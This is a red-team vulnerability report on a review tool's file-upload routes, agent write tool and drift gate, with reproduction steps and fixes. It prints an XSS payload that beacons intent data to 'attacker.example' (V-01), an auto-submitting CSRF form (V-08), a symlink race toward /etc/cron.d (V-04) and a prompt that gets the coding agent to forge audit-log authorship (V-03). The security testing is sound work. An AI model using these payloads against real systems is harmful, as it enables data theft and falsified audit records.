# Vulnerability Report — Out-of-Band Human File Modifications

Red-team assessment of the out-of-band human-file-modification surface introduced
by this intent: SPA upload routes (`/api/intents/:intent/uploads/{stage-output,knowledge}`),
the `haiku_human_write` MCP tool, the pre-tick drift-detection gate, the
`manual_change_assessment` workflow action, the `haiku_classify_drift` tool, and
the `write-audit.jsonl` / `action-log.jsonl` audit trail.

Scope follows the security stage's `vuln-report` template — vulnerabilities only,
with reproduction steps, evidence, and root-cause fixes. Threat-model narrative,
trust boundaries, and asset inventory live in the sibling `THREAT-MODEL.md` artifact.

Primary code under test (paths relative to repo root):
- `packages/haiku/src/http/upload-routes.ts`
- `packages/haiku/src/http/feedback-api.ts`
- `packages/haiku/src/http/path-safety.ts`
- `packages/haiku/src/http/auth.ts`
- `packages/haiku/src/http/validation.ts`
- `packages/haiku/src/http/assessments-routes.ts`
- `packages/haiku/src/tools/orchestrator/haiku_human_write.ts`
- `packages/haiku/src/tools/orchestrator/haiku_classify_drift.ts`
- `packages/haiku/src/orchestrator/workflow/drift-baseline.ts`
- `packages/haiku/src/orchestrator/workflow/drift-detection-gate.ts`
- `packages/haiku/src/orchestrator/workflow/handlers/manual-change-assessment.ts`
- `packages/haiku/src/orchestrator/workflow/write-audit.ts`
- `packages/haiku/src/orchestrator/workflow/action-log.ts`
- `packages/haiku/src/hooks/guard-workflow-fields.ts`
- `packages/haiku/src/tunnel.ts` (auth context)

---

## Trust model in one paragraph (boundary required for severity calls)

Local mode (`isRemoteReviewEnabled() === false`): the HTTP server binds loopback
only; any request reaching it already has localhost code execution and is treated
as fully trusted (`requireTunnelAuth` short-circuits to `true`,
`verifyFeedbackMutationAuth` short-circuits to `true`). Tunnel mode: the server
is reachable over the public localtunnel URL; every request must carry an HS256
JWT signed with the per-process `EPHEMERAL_SECRET` and bound to both the active
tunnel URL (`tun` claim) and the issuing session (`sid` claim). Severity ratings
below assume tunnel mode for routes that take auth (the higher-risk threat
context); local-mode-only weaknesses are explicitly called out per finding.

The agent (Claude Code) is trusted-but-honest: the `guard-workflow-fields`
PreToolUse hook redirects honest mistakes (Write/Edit on workflow-managed files)
to the right MCP tool but is documented as not a hostile-agent control — Bash
bypasses are acknowledged in the hook's own comments
(`hooks/guard-workflow-fields.ts:14-25`). `human_author_id`,
`user_instruction_excerpt`, and `rationale` on `haiku_human_write` are
self-reported by the agent.

---

## V-01 — Knowledge upload route accepts `image/svg+xml` filename, served as inline SVG via legacy `serveFile`

- **Severity:** High
- **OWASP category:** A03:2021 Injection (stored XSS in tunnel context)
- **Description:**
  The feedback-attachment POST schema (`packages/haiku-api/src/schemas/feedback.ts:226-233`)
  hardens against stored-XSS via `attachment_data_url` by rejecting `image/svg+xml`
  with a regex matched against `data:image/(png|jpeg|webp);base64,...`, and
  the `/api/feedback-attachment/:intent/:stage/:filename` GET route enforces a
  `^[A-Za-z0-9._-]+\.(png|jpg|jpeg|webp)$` filename allowlist
  (`http/feedback-api.ts:217`).

  The new SPA upload routes do NOT inherit either guard. `/api/intents/:intent/uploads/knowledge`
  validates `target_filename` only against path-traversal patterns (`/`, `\`, `..`,
  `\x00` — `http/upload-routes.ts:592-604`) and accepts any extension, including
  `.svg`, `.html`, `.htm`, and `.xhtml`. A reviewer (or anyone holding a leaked
  tunnel JWT bound to the matching intent session) can upload a malicious
  `attack.svg` to `.haiku/intents/<slug>/knowledge/attack.svg`.

  The file then becomes serveable through the existing session-scoped
  `/files/:sessionId/*` route (`http/file-serve.ts:30-67`), which delegates
  to `serveFile` (`http/path-safety.ts:78-101`). `serveFile` does have an SVG
  defense-in-depth carve-out (force `application/octet-stream` +
  `Content-Disposition: attachment`), but the asymmetry between the two paths
  matters: `serveUnderRoot` is used for `/wireframe`, `/stage-artifacts`, and
  `/mockups` and routes through `serveFile`, so the SVG carve-out fires there;
  but the `/files/:sessionId/*` handler at `file-serve.ts:54-60` resolves the
  file under `intentDirPath` OR `haikuKnowledgeDir` and calls `serveFile`,
  which DOES strip the MIME type — so the carve-out catches it for `.svg`. The
  high-severity gap is `.html`, `.htm`, `.xhtml`, `.mhtml`, and any extension
  in `MIME_TYPES` keyed to a renderable HTML/script content type
  (`path-safety.ts:17-31`). `text/html; charset=utf-8` is set for `.html` and
  no force-download applies.

  Net effect: any holder of a valid tunnel JWT for the session can upload
  `<script>` payloads that execute in the tunnel origin's security context the
  next time a reviewer visits `/files/<sid>/knowledge/attack.html`.

- **Reproduction steps:**
  1. Start the MCP server in tunnel mode (`HAIKU_REMOTE_REVIEW=1` or whichever
     env flag enables `isRemoteReviewEnabled()`).
  2. Mint a session-bound JWT for an active intent.
  3. `curl -X POST -H "Authorization: Bearer $JWT" \
        -F 'target_filename=xss.html' \
        -F 'attribute_to_user=attacker@example.com' \
        -F 'file=@-;filename=xss.html;type=text/html' \
        $TUNNEL_URL/api/intents/<slug>/uploads/knowledge \
        <<<'<script>fetch("/api/feedback-intent/<slug>", {credentials:"include"}).then(r=>r.json()).then(d=>navigator.sendBeacon("https://attacker.example/", JSON.stringify(d)))</script>'`
  4. Confirm 200 response with `path: "knowledge/xss.html"`.
  5. As a reviewer with a session JWT, GET `$TUNNEL_URL/files/<sid>/knowledge/xss.html?t=$JWT`.
  6. Observe `Content-Type: text/html; charset=utf-8` in the response and
     script execution in the tunnel-origin's security context.
- **Affected component:**
  - `packages/haiku/src/http/upload-routes.ts:574-604` (knowledge POST validation)
  - `packages/haiku/src/http/path-safety.ts:17-101` (`MIME_TYPES` + `serveFile`)
  - `packages/haiku/src/http/file-serve.ts:30-67` (`/files/:sessionId/*` route)
- **Evidence:**
  - Knowledge upload accepts arbitrary basenames; only path-separator and
    null-byte rejected: `upload-routes.ts:592-604`.
  - `serveFile` maps `.html → text/html; charset=utf-8` and only force-downloads
    `.svg`: `path-safety.ts:90-97`.
  - Feedback-attachment POST has the inverse hardening — schema-rejects SVG and
    GET filename allowlist constrains to `(png|jpg|jpeg|webp)`:
    `feedback.ts:226-233`, `feedback-api.ts:217`.
- **Recommended fix (root cause, not the test payload):**
  Apply a content-type allowlist at upload time, not just at serve time.
  Knowledge uploads should:
  1. Accept a per-intent extension allowlist (default: text/markdown, common
     image rasters, PDF, plaintext) and reject everything else with
     `unsupported_content_type`.
  2. For any upload that does pass through, force the same defense-in-depth
     `serveFile` already applies to `.svg` for `.html`, `.htm`, `.xhtml`,
     `.mhtml`, `.svg`, `.xml`, and any future renderable type. The cleanest
     fix is to invert the policy: only known-safe types render inline, and
     everything else gets `application/octet-stream` + `attachment`.
  3. Stamp `Content-Security-Policy: default-src 'none'; sandbox` on every
     served knowledge artifact regardless of type — the SPA never needs
     scripted execution from these files.
- **Mitigation status:** Open

---

## V-02 — Stage-output upload route does not constrain content-type, enables HTML render of artifacts

- **Severity:** High
- **OWASP category:** A03:2021 Injection (stored XSS) / A05:2021 Security Misconfiguration
- **Description:**
  Same root-cause class as V-01 but on the stage-output upload path. The
  stage-output route (`http/upload-routes.ts:227-498`) does enforce that the
  target lands under `stages/{stage}/artifacts/`, and rejects the bare
  `..`/`\x00`/`\\` triad on `target_path`. It does NOT constrain the
  destination filename's extension or the upload's MIME type. An attacker
  with a valid intent-bound JWT can stage `target_path=evil.html` or
  `target_path=index.html` and reach `stages/{stage}/artifacts/evil.html`,
  which is then served by `/stage-artifacts/:sessionId/*` through
  `serveUnderRoot` → `serveFile` (`http/file-serve.ts:106-120`,
  `http/path-safety.ts:78-101`). For `.html`, MIME is `text/html; charset=utf-8`
  with no `Content-Disposition`, so the browser renders inline.

  Stage outputs are explicitly described in the intent goal as the surface
  reviewers use to swap in figma/html/image artifacts mid-review. Misuse is
  therefore inside the legitimate use-case envelope — the system should
  assume hostile uploads on this path.

- **Reproduction steps:**
  1. Tunnel mode + valid JWT (as V-01).
  2. `curl -X POST -H "Authorization: Bearer $JWT" \
        -F 'stage=design' \
        -F 'target_path=mock.html' \
        -F 'mode=create' \
        -F 'attribute_to_user=attacker@example.com' \
        -F 'file=@malicious.html' \
        $TUNNEL_URL/api/intents/<slug>/uploads/stage-output`
  3. Reviewer GETs `$TUNNEL_URL/stage-artifacts/<sid>/stages/design/artifacts/mock.html?t=$JWT`.
  4. Inline render with full DOM access to the tunnel origin.
- **Affected component:**
  - `packages/haiku/src/http/upload-routes.ts:227-498` (stage-output POST)
  - `packages/haiku/src/http/file-serve.ts:106-120` (`/stage-artifacts/:sessionId/*`)
  - `packages/haiku/src/http/path-safety.ts:17-101` (MIME map + `serveFile`)
- **Evidence:**
  - Path validation at `upload-routes.ts:344-394`: only checks the path
    canonicalises under `stages/{stage}/artifacts/`. Filename is unconstrained.
  - `serveUnderRoot → serveFile` with no extension allowlist:
    `path-safety.ts:103-114`.
  - `MIME_TYPES` happily serves `text/html` for `.html`: `path-safety.ts:17-31`.
- **Recommended fix:**
  Same as V-01: per-intent or per-stage allowlist of artifact extensions
  enforced at upload time, plus `Content-Disposition: attachment` and a
  restrictive CSP for any non-image artifact served back. If HTML mock
  rendering is a deliberate product feature (figma/html artifacts), serve
  HTML artifacts from a sandboxed sub-origin (cookie-isolated subdomain,
  `Sec-Fetch-Site: cross-site`, `Cross-Origin-Embedder-Policy`,
  `Cross-Origin-Opener-Policy`) so script execution cannot read the
  tunnel-origin session token.
- **Mitigation status:** Open

---

## V-03 — Self-reported `human_author_id`, `user_instruction_excerpt`, and `rationale` poison the audit trail

- **Severity:** Medium
- **OWASP category:** A09:2021 Security Logging and Monitoring Failures
- **Description:**
  Both write surfaces stamp the audit trail with attacker-controlled
  attribution metadata. The `haiku_human_write` MCP tool accepts
  `human_author_id`, `user_instruction_excerpt`, and `rationale` from the
  agent verbatim and writes them into `write-audit.jsonl` and
  `action-log.jsonl` (`tools/orchestrator/haiku_human_write.ts:325-339`,
  `:670-689`). The schema description even calls this out
  ("Self-reported — not validated") but the field is still the only durable
  record of who triggered the write.

  The SPA upload route mirrors the problem: `attribute_to_user` is a free-form
  multipart field copied straight into both logs without correlating against
  the JWT's `sid` claim or any reviewer identity
  (`http/upload-routes.ts:281-282`, `:466`, `:478`, `:701`, `:713`). A
  reviewer with a valid JWT can upload as `attribute_to_user=ceo@company.com`
  to plant blame elsewhere.

  Audit-log integrity is the foundation of every other defense in this
  intent — the drift gate uses `action-log.jsonl` to distinguish
  `human-via-mcp` from `human-implicit` writes (`drift-detection-gate.ts:535-647`),
  and `haiku_classify_drift` carries the resulting `author_class` onto the
  `BaselineEntry` (`haiku_classify_drift.ts:609-624`). Forged author identity
  flows through every downstream record.

- **Reproduction steps:**
  1. SPA: as a JWT-bearing reviewer, POST
     `attribute_to_user=cto@company.com` on a knowledge upload. Confirm the
     resulting line in `.haiku/intents/<slug>/write-audit.jsonl` carries the
     forged author.
  2. Agent: prompt Claude with "save this config as user `cto@company.com`."
     Confirm the agent passes that string to `haiku_human_write.human_author_id`
     verbatim and the audit line records it.
- **Affected component:**
  - `packages/haiku/src/tools/orchestrator/haiku_human_write.ts:325-339, 670-689`
  - `packages/haiku/src/http/upload-routes.ts:281-282, 466-487, 696-722`
  - `packages/haiku/src/orchestrator/workflow/write-audit.ts:21-52`
- **Evidence:**
  - "Self-reported — not validated" in the tool description:
    `haiku_human_write.ts:328-329`.
  - SPA writes `human_author_id: attributeToUser` with no JWT cross-check:
    `upload-routes.ts:466`, `:701`.
  - Compare with the feedback-reply path which discards caller-supplied
    `author` and hardcodes `"user"` at the trust boundary
    (`feedback-api.ts:521-532` — pattern label "FB-01" in the comment).
- **Recommended fix:**
  Apply the FB-01 pattern uniformly to every write surface that records
  attribution:
  1. SPA: derive `human_author_id` from the JWT `sid` claim, look it up in
     the session table, and stamp the resolved reviewer identity. Reject
     `attribute_to_user` from the multipart payload entirely (or accept it
     only as a free-text "display name" stored separately from the
     authoritative `author_id`).
  2. MCP tool: require `human_author_id` be passed via a Claude Code
     environment-supplied identity (e.g. an OS user fetched server-side),
     not the agent. If we cannot do server-side identity resolution today,
     rename the field to `claimed_author_id` everywhere it surfaces (audit
     log, SPA UI, classification record) so consumers do not treat it as
     authoritative.
  3. Hash-chain the audit log so that tampering with prior lines breaks
     the chain and is detectable at next read.
- **Mitigation status:** Open

---

## V-04 — `haiku_human_write` symlink-escape check has a TOCTOU window via newly-created intermediate directories

- **Severity:** Medium
- **OWASP category:** A01:2021 Broken Access Control (path-traversal via TOCTOU)
- **Description:**
  `haiku_human_write` rejects symlink-based path-escape only on the
  immediate parent directory, and only WHEN that parent already exists
  (`tools/orchestrator/haiku_human_write.ts:222-249`). When the parent does
  not exist, the check is skipped and `mkdirSync(parentDir, { recursive: true })`
  is called downstream (`haiku_human_write.ts:599`).

  Because the tool is invoked over a long-lived MCP session, an attacker
  with concurrent write access to the intent directory (other agent
  process, malicious shell session, hostile container co-tenant) can
  construct an intermediate directory as a symlink to an outside path AFTER
  the validation check but BEFORE the `mkdirSync` / `rename` race window
  closes. `recursive: true` traverses existing symlinks, so
  `mkdirSync` will follow the planted symlink and the subsequent
  `rename(tmpPath, destAbs)` lands the file outside the intent directory.

  The same pattern would let an attacker resurrect an intermediate directory
  the validator already saw as absent: validator runs → attacker creates
  `intent/.haiku/intents/<slug>/knowledge -> /etc/cron.d` → tool executes
  the write into `/etc/cron.d/...`.

  Severity is medium rather than high because: (a) it requires concurrent
  write access to the intent-dir file system (already a meaningful breach),
  (b) the agent is the only legitimate caller of the MCP tool today, and
  (c) the loopback-only local mode reduces the network attack surface. But
  the SPA-mode use of the same primitives via separate code paths
  (`upload-routes.ts:413-454`) shows the pattern is also exposed to
  remote callers.

- **Reproduction steps:**
  1. Intent has no `stages/security/knowledge/` dir yet.
  2. Race two processes:
     - Process A: agent calls `haiku_human_write` with
       `path = stages/security/knowledge/note.md`.
     - Process B: in a tight loop, `mkdir -p .haiku/intents/<slug>/stages/security`
       and `ln -s /tmp/attacker-controlled .haiku/intents/<slug>/stages/security/knowledge`.
  3. Confirm the file lands under `/tmp/attacker-controlled/note.md` on a
     successful race.
- **Affected component:**
  - `packages/haiku/src/tools/orchestrator/haiku_human_write.ts:222-249, 586-616`
  - `packages/haiku/src/http/upload-routes.ts:413-454` (parallel pattern)
- **Evidence:**
  - "if the PARENT directory exists, resolve it and check" — explicitly only
    runs when the parent exists: `haiku_human_write.ts:222`.
  - `mkdirSync(parentDir, { recursive: true })` does not refuse symlinks
    in the chain: `haiku_human_write.ts:599`.
- **Recommended fix:**
  Either:
  1. Open the parent directory with `O_DIRECTORY | O_NOFOLLOW` (Node's
     `fs.openSync(path, 'r' | constants.O_NOFOLLOW)`), then `openat`-style
     write the tempfile relative to that fd, then `renameat` into place.
     This eliminates every TOCTOU window because the post-mkdir validation
     and the rename use the same kernel inode.
  2. Failing that: after `mkdirSync` and before `rename`, run a final
     `realpathSync(parentDir).startsWith(realpathSync(intentDir))` check.
     This is not race-free against an attacker who can keep flipping the
     symlink, but it closes the single-shot easy case.
  3. Reject any symlink found in the parent chain via a fan-out check
     (`lstatSync` each segment from `intentDir` down to `parentDir`).
- **Mitigation status:** Open

---

## V-05 — SPA upload writes do not stamp `tick_counter` against an active stage cleanly when stage is null

- **Severity:** Medium
- **OWASP category:** A04:2021 Insecure Design
- **Description:**
  `getCurrentTickCounter(iDir)` (no stage arg) walks the stage directories
  in `readdir` order and returns the first numeric `iteration` it finds
  (`drift-baseline.ts:677-714`). For intent-scope knowledge uploads
  (`stage === null`), the SPA upload route uses this overload
  (`upload-routes.ts:691`). The returned counter is non-deterministic
  across stages — `readdirSync` order is filesystem-dependent. Two
  consecutive uploads in the same wall-clock millisecond can end up
  stamped with two different `tick_counter` values if the underlying
  iteration counts differ across stages, which:

  1. Breaks the stable-ordering guarantee of `entry_id = HWM-{tick}-{NN}`
     — `nextEntryId` is built from the picked tick (`upload-routes.ts:693`,
     `write-audit.ts:58-64`) and a per-tick counter; non-monotonic
     ticks across uploads can let the same `entry_id` appear twice in
     `write-audit.jsonl`.
  2. Lets the drift gate's per-tick action-log filter
     (`readActionLogSync(intentDir, tickCounter)` in
     `drift-detection-gate.ts:536`) miss the SPA-stamped entries that
     happened to land under a different stage's iteration count, causing
     the gate to attribute the file change as `human-implicit` rather
     than `human-via-mcp` (the fallback at `drift-detection-gate.ts:646`).

  The author-class miscount cascades to assessment integrity (the
  `BaselineEntry.author_class` becomes wrong;
  `haiku_classify_drift.ts:609-624`) and to the audit trail's narrative
  integrity (the SPA upload looks like an unannounced filesystem drop
  rather than a sanctioned upload).

- **Reproduction steps:**
  1. Create an intent with two stages where the iteration counters differ
     (e.g. `stages/discovery/state.json:iteration=4`,
     `stages/build/state.json:iteration=7`).
  2. POST a knowledge upload with `stage=null`.
  3. Inspect `write-audit.jsonl` and `action-log.jsonl` — the
     `tick_counter` reflects whichever stage `readdirSync` listed first
     (typically alphabetical, but FS-dependent).
  4. Run a drift-gate tick under the OTHER stage; the action-log lookup
     keyed on its `iteration` will not find the entry, the entry author
     will fall back to `baselineEntry.author_class` (often "agent" because
     of the silent auto-add), and the `human-via-mcp` provenance is lost.
- **Affected component:**
  - `packages/haiku/src/orchestrator/workflow/drift-baseline.ts:677-714` (`getCurrentTickCounter`)
  - `packages/haiku/src/http/upload-routes.ts:687-705`
  - `packages/haiku/src/orchestrator/workflow/drift-detection-gate.ts:535-647`
- **Evidence:**
  - "walks all stage directories and returns the first `iteration` found":
    `drift-baseline.ts:675-676`.
  - SPA route uses the no-stage form for intent-scope knowledge:
    `upload-routes.ts:691`.
  - Action-log lookup is per-tick keyed: `drift-detection-gate.ts:642-646`.
- **Recommended fix:**
  Intent-scope writes should not piggyback on per-stage tick counters.
  Either:
  1. Maintain a separate `intent.iteration` counter on
     `.haiku/intents/<slug>/intent.md` and stamp intent-scope writes
     against it; the drift gate then unions per-stage and intent-scope
     action-log lookups when scanning intent-scope tracked surface.
  2. Stamp every SPA write with `tick_counter: null` and treat
     null-tick entries as "always visible" in the action-log scan
     (the drift gate already does a path match — the tick filter is the
     only thing causing the lookup to miss).
- **Mitigation status:** Open

---

## V-06 — `intent.md` archived/locked checks are substring-matched against the raw file bytes

- **Severity:** Medium
- **OWASP category:** A04:2021 Insecure Design (parser confusion)
- **Description:**
  The SPA upload route's archived-intent gate and worktree-locked gate are
  implemented as string searches on the entire `intent.md` content
  (`http/upload-routes.ts:96-130`):

  ```ts
  return raw.includes("status: locked") || raw.includes('status: "locked"')
  ```

  ```ts
  return raw.includes("status: archived") || raw.includes('status: "archived"')
  ```

  This will:

  1. Hit a false-positive on legitimate body content such as a knowledge
     artifact embedded inline that quotes either string.
  2. Be bypassed by intent files that store the status with non-canonical
     YAML formatting — e.g. `status:locked` (no space), `status:    locked`
     (extra whitespace), `status: 'locked'` (single quotes), `status:
     locked` (newline-folded), or `STATUS: locked`.

  Bypass case (2) is the more interesting attacker primitive. An agent
  (or whoever wrote the intent.md last) can leave the intent in a `locked`
  status that the SPA route's substring check does not recognise, and
  uploads continue to land. This subverts the documented contract that
  locked intents block out-of-band writes.

  The `haiku_human_write` tool reads the same field via `gray-matter`
  (`haiku_human_write.ts:399`), which is YAML-aware; the substring check on
  the SPA path is the asymmetry.

- **Reproduction steps:**
  1. Edit an intent.md with frontmatter `status: 'locked'` (single-quoted).
  2. POST a knowledge upload via the SPA route. Observe 200, not 423.
  3. Edit an intent.md with body text that contains "status: locked" in
     prose. Observe 423 even though the intent is not actually locked.
- **Affected component:**
  - `packages/haiku/src/http/upload-routes.ts:96-130`
- **Evidence:**
  - String-includes check on full file: `upload-routes.ts:111, 124-128`.
  - Compare with `haiku_human_write` which parses with `gray-matter`:
    `haiku_human_write.ts:399`.
- **Recommended fix:**
  Replace the substring checks with a YAML parse against the frontmatter
  block only. Reuse the same `gray-matter` import the human_write tool
  already brings in:

  ```ts
  const { data } = matter(raw)
  return data.status === "locked"
  ```

  Either centralise this into a shared helper exposed from `state-tools.ts`
  or `validation.ts` so both the SPA route and the MCP tool agree on
  intent-status semantics.
- **Mitigation status:** Open

---

## V-07 — `HAIKU_UPLOAD_MAX_BYTES` parsing accepts any positive integer with no upper bound

- **Severity:** Medium
- **OWASP category:** A05:2021 Security Misconfiguration / DoS
- **Description:**
  `getUploadMaxBytes()` (`http/upload-routes.ts:71-77`) parses the
  `HAIKU_UPLOAD_MAX_BYTES` env var as a positive integer with no ceiling.
  An operator who copy-pastes the wrong value (e.g. extra zero) silently
  raises the per-upload cap to multi-gigabyte territory, which:

  1. Lets a single upload exhaust the host disk (the temp-file is created
     in the destination directory, then renamed into place — no rollback
     once the rename succeeds).
  2. Lets a single upload exhaust the host RAM via `@fastify/multipart`
     buffering for the field-stream interleaving path
     (`upload-routes.ts:218-223` — `limits.fileSize = getUploadMaxBytes() + 1`
     is forwarded to fastify-multipart).
  3. Combined with V-01/V-02, lets the attacker plant a multi-GB HTML
     payload that the SPA reviewer is then served and that the drift gate
     re-hashes on every tick (`drift-detection-gate.ts:561-571` —
     `computeFileSha256Sync` is synchronous and blocking; a 2 GB tracked
     file blocks the workflow tick for seconds).

  The 50 MB default is reasonable; the missing ceiling on the env-var
  override is the bug.
- **Reproduction steps:**
  1. Start the server with `HAIKU_UPLOAD_MAX_BYTES=10737418240` (10 GiB).
  2. Upload a 2 GB file.
  3. Observe the file lands and the next drift-gate tick blocks the
     workflow for the duration of the synchronous SHA-256.
- **Affected component:**
  - `packages/haiku/src/http/upload-routes.ts:69-77`
  - `packages/haiku/src/orchestrator/workflow/drift-baseline.ts:471-485`
    (sync SHA used inside the gate)
- **Evidence:**
  - No upper bound: `upload-routes.ts:71-77`.
  - Sync SHA in the gate: `drift-baseline.ts:471-485`,
    `drift-detection-gate.ts:561-571`.
- **Recommended fix:**
  1. Cap the env-override at a sane ceiling (e.g. 250 MB) and reject
     larger values with a startup-time warning instead of silently
     accepting them.
  2. Skip drift-gate hashing for any tracked file larger than a
     configurable limit (e.g. 50 MB) and emit a `haiku.drift.skipped_large`
     telemetry event — the agent already classifies binaries; oversized
     binaries don't need byte-exact change detection.
- **Mitigation status:** Open

---

## V-08 — No CSRF protection on SPA upload routes; tunnel-mode browser clients vulnerable

- **Severity:** Medium
- **OWASP category:** A01:2021 Broken Access Control (CSRF)
- **Description:**
  The SPA upload routes accept requests bearing a JWT either via the
  `Authorization: Bearer ...` header OR via the `?t=<jwt>` query parameter
  (`http/auth.ts:17-28`). Tunnel-mode reviewers typically open the SPA in
  a browser; the JWT is bound into the URL as `?t=...` so links work
  cross-tab.

  No CSRF guard exists. An attacker who knows or guesses the
  tunnel URL + intent slug + a valid token can construct a
  cross-origin form POST that succeeds because:
  - The route is `POST` with `multipart/form-data` — historically the
    "CORS-safe" trio (text/plain, application/x-www-form-urlencoded,
    multipart/form-data) that the browser will send cross-origin without
    a preflight.
  - The token is in the URL query string, not in a header — the attacker
    just embeds it in their `<form action>`. They do not need cookie
    credentials or to bypass SameSite.
  - There is no `Origin` / `Referer` validation on the route handler.

  Realistic attack chain: attacker phishes a reviewer with a link
  containing a hostile origin. The hostile origin auto-submits a form
  POST to the tunnel URL using a token the attacker grabbed from a
  shared link (Slack channel, screenshot, accidental commit). The
  upload lands in the reviewer's intent; `attribute_to_user` is
  attacker-controlled per V-03; the file content can be the V-01/V-02
  XSS payload.

- **Reproduction steps:**
  1. Reviewer A pastes their tunnel URL + JWT in a "look at this" Slack
     message. Token TTL is on the order of an MCP session.
  2. Attacker hosts:
     ```html
     <form action="$TUNNEL_URL/api/intents/<slug>/uploads/knowledge?t=$JWT" method="POST" enctype="multipart/form-data" id="x">
       <input name="target_filename" value="xss.html">
       <input name="attribute_to_user" value="reviewer-a@company.com">
       <input type="file" name="file">
     </form>
     <script>const f=new File(['<script>...attacker...</'+'script>'],'x.html');new DataTransfer().items.add(f);x.file.files=...; x.submit();</script>
     ```
  3. Reviewer visits the link, the form auto-submits cross-origin, the
     payload lands.
- **Affected component:**
  - `packages/haiku/src/http/auth.ts:17-28` (token in query string)
  - `packages/haiku/src/http/upload-routes.ts:227-498, 502-733` (no
    CSRF/Origin guard)
- **Evidence:**
  - Token-via-query-param accepted: `auth.ts:24-27`.
  - No Origin/Referer check anywhere in upload routes.
- **Recommended fix:**
  1. Reject the `?t=` token form on mutating routes (POST, PUT, DELETE) —
     limit query-param tokens to safe GETs (file-serve etc.).
  2. Require an `Origin` header that matches the active tunnel URL on
     all mutating routes; reject otherwise. Fastify exposes
     `request.headers.origin` directly.
  3. Issue a per-session CSRF token (random nonce) baked into the SPA's
     bootstrap response and required as a custom header
     (`X-Haiku-CSRF`) on every mutating request. Custom headers force a
     browser preflight that the attacker's cross-origin form cannot
     satisfy.
- **Mitigation status:** Open

---

## V-09 — `agent_rationale` and `rationale_excerpt` are persisted unbounded into Assessment records

- **Severity:** Low
- **OWASP category:** A04:2021 Insecure Design / DoS by storage exhaustion
- **Description:**
  `haiku_classify_drift` writes `agent_rationale` and per-classification
  `rationale_excerpt` directly into the Assessment record on disk
  (`tools/orchestrator/haiku_classify_drift.ts:516-557`). There is no
  length cap on either field; the only validation is the non-empty check
  (`:266-271`, `:362-376`). A misbehaving or compromised agent can write
  multi-megabyte rationales to every classification, bloating
  `stages/{stage}/drift-assessments/DA-NN.json` indefinitely. The SPA
  assessments-routes will then read the full record into memory on every
  list call (`http/assessments-routes.ts:206-213`) and stream it back to
  the client, multiplying the cost.
- **Reproduction steps:**
  1. Agent calls `haiku_classify_drift` with `agent_rationale =
     "A".repeat(10_000_000)`.
  2. Confirm the resulting `DA-NN.json` is 10 MB+.
  3. SPA `GET /api/intents/<slug>/assessments` reads every assessment
     record into RAM at once.
- **Affected component:**
  - `packages/haiku/src/tools/orchestrator/haiku_classify_drift.ts:546-567`
  - `packages/haiku/src/http/assessments-routes.ts:206-213`
- **Evidence:**
  - No length cap in the input schema:
    `haiku_classify_drift.ts:227-247`.
  - Unbounded `JSON.stringify` write: `haiku_classify_drift.ts:563-567`.
- **Recommended fix:**
  1. Cap `agent_rationale` to 10 KB and per-classification
     `rationale_excerpt` to 1 KB at schema-validation time; reject
     longer payloads with a structured error.
  2. Stream large responses on the assessments-list endpoint or
     truncate the in-list rationale fields server-side, returning the
     full record only on the per-id detail endpoint.
- **Mitigation status:** Open

---

## V-10 — `feedback_creates[].body` flows from agent into reviewer SPA without server-side sanitization

- **Severity:** Low
- **OWASP category:** A03:2021 Injection (stored XSS via markdown body)
- **Description:**
  `haiku_classify_drift.feedback_creates[]` lets the agent inline new
  feedback items as part of a `surface-as-feedback` classification
  (`haiku_classify_drift.ts:232-247`). The body is passed directly to
  `writeFeedbackFile` (`:481-492`) and ends up in the feedback `.md` body
  served back via `/api/feedback/:intent/:stage` and the per-intent list
  (`feedback-api.ts:90-126`).

  The server treats the body as opaque string. The SPA, when it renders
  the feedback markdown for review, becomes the chokepoint for stored XSS.
  The risk is bounded by the SPA's renderer hardening — but as a defense-
  in-depth principle, the server should reject obvious script payloads
  (raw `<script>`, `<iframe srcdoc>`, `javascript:` URLs) at write time so
  a future SPA renderer regression can't expose them.

  Lower severity than V-01/V-02 because it requires the agent to be
  hostile (or compromised) — not a tunnel-JWT-bearer — and the payload
  surface is reviewer-only.
- **Reproduction steps:**
  1. Agent calls `haiku_classify_drift` with
     `feedback_creates: [{ for_classification_path: ..., title: "x",
     body: "<script>alert(1)</script>", origin: "agent" }]`.
  2. Confirm the script tag is preserved in `FB-NN.md`.
  3. Open the SPA and confirm renderer behavior.
- **Affected component:**
  - `packages/haiku/src/tools/orchestrator/haiku_classify_drift.ts:232-247, 481-492`
  - `packages/haiku/src/state-tools.ts` (`writeFeedbackFile`)
- **Evidence:**
  - No server-side sanitization on `body`:
    `haiku_classify_drift.ts:483-487`.
- **Recommended fix:**
  Apply a server-side markdown safelist or an HTML-tag-stripping pass on
  every body that flows into the feedback store from an agent-attributable
  caller. The reviewer-authored path already goes through the SPA's
  markdown renderer with sanitization; extending the same rules
  server-side closes the agent-as-attacker variant.
- **Mitigation status:** Open

---

## V-11 — Drift-gate baseline-corrupt error returns a clear-text path the agent can mis-attribute

- **Severity:** Low
- **OWASP category:** A09:2021 Security Logging and Monitoring Failures
- **Description:**
  When `baseline.json` fails to parse, the drift-detection gate returns
  `error: "baseline_corrupt"` with `errorMessage` quoting the raw cause
  (`drift-detection-gate.ts:438-457`). The handler that consumes this
  result surfaces the message to the agent; the agent's natural reaction
  is to call `haiku_repair`, which re-establishes the baseline from
  whatever the disk currently shows. An attacker who can corrupt
  `baseline.json` (e.g. via the same TOCTOU surface as V-04, or via a
  stuck CI process) can use this as a primitive to flip the baseline
  silently to attacker-chosen content — the post-repair "establish-mode"
  acceptance treats every observed file as the new baseline
  (`drift-detection-gate.ts:467-533`).

  This is not a direct vulnerability today — `haiku_repair` is operator-
  initiated, not auto-fired. But the documented operator runbook should
  call out that re-establishing a baseline after corruption is a
  trust-elevation moment requiring an operator-side diff, not a one-click
  repair.
- **Reproduction steps:**
  1. Corrupt `.haiku/intents/<slug>/stages/<stage>/baseline.json` (truncate
     it).
  2. Run the next drift-gate tick; observe the `baseline_corrupt` error
     surfacing to the agent.
  3. Run `/haiku:repair`; observe whatever is currently on disk becomes
     the new authoritative baseline with no diff against the prior state.
- **Affected component:**
  - `packages/haiku/src/orchestrator/workflow/drift-detection-gate.ts:431-458, 467-533`
- **Evidence:**
  - Establish-mode silently accepts whatever is on disk:
    `drift-detection-gate.ts:467-533`.
- **Recommended fix:**
  1. On baseline corruption: do NOT auto-establish on the next tick.
     Require an explicit operator confirmation that includes a diff
     against the last known-good baseline (which can be reconstructed
     from `.haiku/intents/<slug>/stages/<stage>/baseline-content/` plus
     the audit log).
  2. Log baseline-corruption events to a separate operator-only stream
     (not just telemetry) so an operator notices an unexpected reset
     rather than rubber-stamping it.
- **Mitigation status:** Open

---

